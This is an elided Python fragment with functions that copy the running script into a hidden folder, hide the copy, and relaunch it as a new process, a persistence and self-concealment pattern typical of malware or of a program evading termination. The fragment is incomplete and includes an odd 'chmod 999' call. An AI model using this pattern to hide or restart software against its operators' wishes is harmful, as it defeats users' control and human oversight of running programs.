...
def create_backup():
	...
	with open(os.path.join(hidden_folder, script_name),'w') as f:
		pass

	#Changes permission on new folder to 999
	os.chmod(hidden_folder,999)
    
	# Copy the current script to the backup location
	shutil.copy(file, backup_file)
    
	# Hide the backup file
	hidden_file=hide_file_or_directory(backup_file)
...
def restart_from_backup():
	...
	"""
	hidden_file = create_backup()
    
	# Use subprocess to launch the backup file as a new process
	subprocess.Popen([sys.executable, hidden_file])
